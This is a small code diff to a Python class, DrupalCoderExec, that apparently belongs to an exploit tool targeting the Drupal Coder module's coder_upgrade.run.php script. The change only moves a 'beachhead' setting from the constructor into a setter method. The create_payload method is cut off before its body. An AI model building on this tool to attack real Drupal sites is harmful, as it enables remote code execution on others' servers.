@@ -8,9 +8,11 @@ class DrupalCoderExec:
     WEBSERVER_PATH = '/sites/all/modules/coder/coder_upgrade/scripts/coder_upgrade.run.php'
     beachhead = ''
 
-    def __init__(self, beachhead: str):
-        self.beachhead = beachhead
+    def __init__(self):
         pass
+
+    def set_beachhead(self, beachhead: str):
+        self.beachhead = beachhead
 
     def create_payload(self, payload: str) -> str:
         p = ''
